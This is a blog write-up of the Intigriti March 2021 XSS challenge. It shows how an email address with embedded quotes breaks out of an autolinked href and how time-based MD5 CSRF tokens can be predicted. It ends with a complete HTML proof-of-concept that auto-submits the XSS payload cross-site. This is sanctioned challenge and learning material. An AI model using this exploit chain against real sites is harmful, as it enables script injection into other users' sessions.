---
layout: post
title:  "Write-up: Intigriti March 2021 XSS Challenge"
date:   2021-03-28 23:00:00 +0000
categories: security
---

The following is my write-up for the [March 2021 Intigriti XSS challenge](https://twitter.com/intigriti/status/1373971576564154369).

![header](/assets/intigriti-0321/intro.png)

## Let's Get Started...

The challenge takes place on a single web page, though this one appears more dynamic than those I've seen from Intigriti in the past.

The stand-out feature of the page is a facility to store notes.

![notes](/assets/intigriti-0321/notes.png)

A few tests show that the notes section will remember any input saved to it, and that input seems to be escaped, preventing initial injection attempts.

Interestingly, the source code reveals the notes field is not a traditional `input` or `textarea` tag, but is instead using the `contenteditable` attribute.

```html
<p id="notes-display" class="card-content" contenteditable="true">note goes here</p>
```

The [`contenteditable` attribute](https://html.spec.whatwg.org/multipage/interaction.html#attr-contenteditable) essentially allows the user to modify the contents of an HTML element directly in the browser. This hints that the content that can be included here could be <i>richer</i> than simple plain text...

## Vulnerability 0x01: XSS

Some insight can be gained by doctoring the parameter names to make them arrays instead (`csrf` becomes `csrf[]`), such as:

```bash
curl -s -H 'Cookie: PHPSESSID=2cd32827b0ac21661fb4ae0d1d01bc05;' https://challenge-0321.intigriti.io/ --data-raw 'csrf[]=4b83d5b395d31ec72883368383477f1b&notes=hello'
<br />
<b>Warning</b>:  strcmp() expects parameter 2 to be string, array given in <b>/var/www/html/index.php</b> on line <b>7</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:7) in <b>/var/www/html/index.php</b> on line <b>13</b><br />

curl -s -H 'Cookie: PHPSESSID=c3c310b4805be2b87f6d7b125876ecbd;' https://challenge-0321.intigriti.io/ --data-raw 'csrf=9b114d8556cad469ce80063805a8e4ac&notes[]=hello' | grep Warning
<b>Warning</b>:  htmlspecialchars() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>94</b><br />
```

Doing this to the `notes` parameter reveals the output is run through the [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) PHP function, which should prevent XSS attempts on this field, unless there is further functionality that has an effect on the output.

Luckily, experimenting with some different input text reveals some extra, hidden functionality. Specifying a link, such as `https://evil.com` results in the site adding markup to the output:

```html
<p id="notes-display" class="card-content" contenteditable="true"><a href="https://evil.com" target="_blank">https://evil.com</a></p>
```

This also works with email addresses. After a lot of reading (and a lot of failing) at this point, I eventually resorted to reading [RFC 2822](https://tools.ietf.org/html/rfc2822). The way the vast majority of the internet handles email address validation is apparently very wrong, as the document reveals email addresses can in fact contain a variety of non-alphanumeric characters.

For example, the following email address is technically valid:

```
"What the flip"@xss.com
```
 
As the email address appears inside the `href` attribute of an `<a>` tag, is it possible to break out the double quote delimited attribute using the quotes in such an email address?

Well, yes.

The following payload breaks out of the attribute and adds an `onmouseover` event to the anchor, meaning an XSS is triggered when the user mouses over it.

```
"onmouseover=alert('flag{THIS_IS_THE_FLAG}');x="@hax.com
```

This works well, but the challenge is far from over. This is currently only a self-XSS, as the payload has had to be manually inserted to trigger it.

An HTML form can be crafted that submits to the challenge site and triggers the above case, but this seems to result in an HTTP 403...

## Vulnerability 0x02: CSRF Bypass

It looks like the page has CSRF protection built in. The page generates a special token and stores it in a hidden form input. When the form is submitted, the server checks this token matches in order to ensure the form hasn't been submitted by a malicious site.

```html
<input type="hidden" name="csrf" value="12aa2cfb4c861e1c302ce734f468dc7b"/>
```

In order for our malicious form to exploit the XSS vulnerability, we need to be able to supply a valid CSRF token.

There's an additional clue near the end of the HTML that can help us out:

```html
<!-- page generated at 2021-03-23 20:36:11 -->
```

This comment must be here for a reason, and I took it as a hint that the CSRF token is time based. 

A common method for generating CSRF tokens is to create a cryptographic hash of the current timestamp, though it is better practice to use random input, or to at least salt the hash.

In this case, it's possible to predict the CSRF token by producing an MD5 hash of the current unix timestamp.

Loading the page gives us:

```html
<input type="hidden" name="csrf" value="12aa2cfb4c861e1c302ce734f468dc7b"/>

... snip ...

<!-- page generated at 2021-03-23 20:36:11 -->
```

Converting the time mentioned above to a unix timestamp gives `1616531771`. This can be achieved with the Javascript:

```js
Date.parse('2021-03-23 20:36:11')/1000
```

Hashing this value gives us a value which exactly matches the CSRF token in the form:

```bash
$ echo -n 1616531771 | md5sum
12aa2cfb4c861e1c302ce734f468dc7b  -
```

This means we can predict CSRF tokens simply by knowing the server time.

## The Solution

Putting all of this together gives us the following proof of concept:

```html
<html>
   <body>
      <iframe style="width:1px;position:fixed;left:-1px;" src="https://challenge-0321.intigriti.io/"></iframe>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
      <script>
         var ts = 5 + Math.round((new Date()).getTime()/1000);
         var passhash = CryptoJS.MD5(ts+'').toString();
         setTimeout(function(){
           document.getElementById("csrf").value = passhash;
           document.getElementById("payload").value = "\"onmouseover=alert('flag{THIS_IS_THE_FLAG}');x=\"@hax.com";
           document.getElementById("send").submit();
         }, 250);
      </script>
      <form method="POST" action="https://challenge-0321.intigriti.io/" id="send">
         <input type="hidden" name="csrf" id="csrf" value=""/>
         <input type="hidden" id="payload"  name="notes" value=""/>
      </form>
   </body>
</html>
```

The PoC loads the target site in an iframe, causing a CSRF token to get generated. It then takes the current timestamp and creates an MD5 hash of it, hopefully creating an identical CSRF token.

As you can see, I had to add 5 seconds to the current timestamp, as my local time appeared to be 5 seconds behind the time of the target server.

Then the XSS payload we discovered earlier is combined with the resultant hash and submitted in a form to the target challenge server.

This results in a working XSS once the user mouses over the link.

![success](/assets/intigriti-0321/success.png)

Success! Thanks Intigriti for another fun challenge!
